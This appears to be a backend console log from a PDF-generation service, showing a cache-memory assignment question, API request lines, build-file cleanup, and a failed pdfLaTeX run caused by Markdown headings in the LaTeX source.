+Discuss the design considerations for optimizing cache performance, taking into account the following factors: 
+
+- Cache size and its impact on hit rate and system speed. 
+
+- Cache organization, including direct-mapped, fully associative, and set-associative caches, and the trade-offs between them. 
+
+- Replacement policies, such as Least Recently Used (LRU), and their influence on cache efficiency. 
+
+- Write policies, including write-back and write-through, and their implications for data consistency and system performance. 
+
+Provide specific examples and analyses to substantiate your explanations, ensuring a comprehensive understanding of cache memory's role and the design choices that influence its performance within the memory hierarchy.
+hear we are {'is_selected_for_assignment': True} [15/Jun/2024 08:55:11] "PATCH /api/questions/14/ HTTP/1.1" 200 2554
+The concept of a memory hierarchy is integral to computer architecture, illustrating the various levels of memory and their roles in storing and providing access to data. At the pinnacle of this hierarchy resides the cache memory, an essential component strategically positioned to facilitate expeditious data retrieval and enhance system performance. 
+
+## Question: 
+
+### Part 1: 
+
+Explain the concept of a memory hierarchy, its purpose, and the unique position cache memory occupies within this structure. Elaborate on the following: 
+
+- The strategic placement of cache memory within the hierarchy and its proximity to the processor. 
+
+- How cache memory interacts with other memory levels, such as main memory and secondary storage. 
+
+### Part 2: 
+
+Provide a diagram illustrating the memory hierarchy, clearly depicting the following: 
+
+- The various levels of the hierarchy, including cache memory, main memory, and secondary storage. 
+
+- The flow of data between the processor and different memory levels, highlighting cache memory's role as a high-speed intermediary. 
+
+### Part 3: 
+
+Discuss the design considerations for optimizing cache performance, taking into account the following factors: 
+
+- Cache size and its impact on hit rate and system speed. 
+
+- Cache organization, including direct-mapped, fully associative, and set-associative caches, and the trade-offs between them. 
+
+- Replacement policies, such as Least Recently Used (LRU), and their influence on cache efficiency. 
+
+- Write policies, including write-back and write-through, and their implications for data consistency and system performance. 
+
+Provide specific examples and analyses to substantiate your explanations, ensuring a comprehensive understanding of cache memory's role and the design choices that influence its performance within the memory hierarchy.
+Removed: latex/assignment_pdf.aux
+Removed: latex/assignment_pdf.fls
+Removed: latex/assignment_pdf.fdb_latexmk
+Removed: latex/assignment_pdf.log
+Removed: latex/assignment_pdf.pdf
+Removed: latex/assignment_pdf.tex
+All files in the latex folder have been removed successfully.
+5
+Rc files read:
+  /etc/LatexMk
+Latexmk: This is Latexmk, John Collins, 20 November 2021, version: 4.76.
+Rule 'pdflatex': File changes, etc:
+   Changed files, or newly in use since previous run(s):
+      '/root/Project/Backend/latex/assignment_pdf.tex'
+------------
+Run number 1 of rule 'pdflatex'
+------------
+------------
+Running 'pdflatex  --interaction=nonstopmode -recorder  "/root/Project/Backend/latex/assignment_pdf.tex"'
+------------
+Latexmk: applying rule 'pdflatex'...
+This is pdfTeX, Version 3.141592653-2.6-1.40.22 (TeX Live 2022/dev/Debian) (preloaded format=pdflatex)
+ restricted \write18 enabled.
+entering extended mode
+(/root/Project/Backend/latex/assignment_pdf.tex
+LaTeX2e <2021-11-15> patch level 1
+L3 programming layer <2022-01-21>
+(/usr/share/texlive/texmf-dist/tex/latex/base/article.cls
+Document Class: article 2021/10/04 v1.4n Standard LaTeX document class
+(/usr/share/texlive/texmf-dist/tex/latex/base/size10.clo))
+(/usr/share/texlive/texmf-dist/tex/latex/base/fontenc.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/base/inputenc.sty)
+(/usr/share/texmf/tex/latex/lm/lmodern.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/base/textcomp.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/lastpage/lastpage.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/geometry/geometry.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/keyval.sty)
+(/usr/share/texlive/texmf-dist/tex/generic/iftex/ifvtex.sty
+(/usr/share/texlive/texmf-dist/tex/generic/iftex/iftex.sty)))
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphicx.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphics.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/trig.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/graphics-cfg/graphics.cfg)
+(/usr/share/texlive/texmf-dist/tex/latex/graphics-def/pdftex.def)))
+(/usr/share/texlive/texmf-dist/tex/latex/ragged2e/ragged2e.sty)
+(/usr/share/texmf/tex/latex/lm/t1lmr.fd)
+(/usr/share/texlive/texmf-dist/tex/latex/l3backend/l3backend-pdftex.def)
+(./assignment_pdf.aux)
+*geometry* driver: auto-detecting
+*geometry* detected driver: pdftex
+(/usr/share/texlive/texmf-dist/tex/context/base/mkii/supp-pdf.mkii
+[Loading MPS to PDF converter (version 2006.09.02).]
+) (/usr/share/texlive/texmf-dist/tex/latex/epstopdf-pkg/epstopdf-base.sty
+(/usr/share/texlive/texmf-dist/tex/latex/latexconfig/epstopdf-sys.cfg))
+(/usr/share/texmf/tex/latex/lm/ot1lmr.fd)
+(/usr/share/texmf/tex/latex/lm/omllmm.fd)
+(/usr/share/texmf/tex/latex/lm/omslmsy.fd)
+(/usr/share/texmf/tex/latex/lm/omxlmex.fd)
+! You can't use `macro parameter character #' in vertical mode.
+l.48 #
+      # Question:
+! You can't use `macro parameter character #' in vertical mode.
+l.48 ##
+        Question:
+! You can't use `macro parameter character #' in vertical mode.
+l.50 #
+      ## Part 1:
+! You can't use `macro parameter character #' in vertical mode.
+l.50 ##
+       # Part 1:
+! You can't use `macro parameter character #' in vertical mode.
+l.50 ###
+         Part 1:
+! You can't use `macro parameter character #' in vertical mode.
+l.58 #
+      ## Part 2:
+! You can't use `macro parameter character #' in vertical mode.
+l.58 ##
+       # Part 2:
+! You can't use `macro parameter character #' in vertical mode.
+l.58 ###
+         Part 2:
+! You can't use `macro parameter character #' in vertical mode.
+l.66 #
+      ## Part 3:
+! You can't use `macro parameter character #' in vertical mode.
+l.66 ##
+       # Part 3:
+! You can't use `macro parameter character #' in vertical mode.
+l.66 ###
+         Part 3:
+[1{/var/lib/texmf/fonts/map/pdftex/updmap/pdftex.map} <./logo.png>]
+! You can't use `macro parameter character #' in vertical mode.
+l.86 #
+      # Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.86 ##
+        Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.88 #
+      ## Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.88 ##
+       # Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.88 ###
+         Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.91 #
+      ## Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.91 ##
+       # Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.91 ###
+         Part 2: Recommendation for High-Performance Computing
+[2 <./questionattachments/46993.jpg>]
+! You can't use `macro parameter character #' in vertical mode.
+l.104 #
+       # Part 1:
+! You can't use `macro parameter character #' in vertical mode.
+l.104 ##
+         Part 1:
+! You can't use `macro parameter character #' in vertical mode.
+l.108 #
+       # Part 2:
+! You can't use `macro parameter character #' in vertical mode.
+l.108 ##
+         Part 2:
+! You can't use `macro parameter character #' in vertical mode.
+l.117 #
+       # Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.117 ##
+         Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.119 #
+       ## Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.119 ##
+        # Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.119 ###
+          Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.122 #
+       ## Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.122 ##
+        # Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.122 ###
+          Part 2: Recommendation for High-Performance Computing
+[3 <./questionattachments/SAT_Poster_dgTs8F5.png>]
+! You can't use `macro parameter character #' in vertical mode.
+l.131 #
+       # Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.131 ##
+         Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.133 #
+       ## Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.133 ##
+        # Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.133 ###
+          Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.136 #
+       ## Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.136 ##
+        # Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.136 ###
+          Part 2: Recommendation for High-Performance Computing
+
+AED: lastpage setting LastPage
+[4 <./questionattachments/SAT_Poster.png>] (./assignment_pdf.aux)
+
+LaTeX Warning: Label(s) may have changed. Rerun to get cross-references right.
+
+ )
+(see the transcript file for additional information){/usr/share/texmf/fonts/enc
+/dvips/lm/lm-ec.enc}</usr/share/texmf/fonts/type1/public/lm/lmbx10.pfb></usr/sh
+are/texmf/fonts/type1/public/lm/lmbx12.pfb></usr/share/texmf/fonts/type1/public
+/lm/lmr10.pfb></usr/share/texmf/fonts/type1/public/lm/lmr12.pfb>
+Output written on assignment_pdf.pdf (4 pages, 518006 bytes).
+Transcript written on assignment_pdf.log.
+Latexmk: References changed.
+Latexmk: Log file says output to 'assignment_pdf.pdf'
+Collected error summary (may duplicate other messages):
+  pdflatex: Command for 'pdflatex' gave return code 1
+      Refer to 'assignment_pdf.log' for details
+Latexmk: Use the -f option to force complete processing,
+ unless error was exceeding maximum runs, or warnings treated as errors.
+Latexmk: Examining 'assignment_pdf.log'
+=== TeX engine is 'pdfTeX'
+Latexmk: Errors, so I did not complete making targets
+
+An error occurred: [15/Jun/2024 08:55:14] "POST /generate_pdf/ HTTP/1.1" 200 41
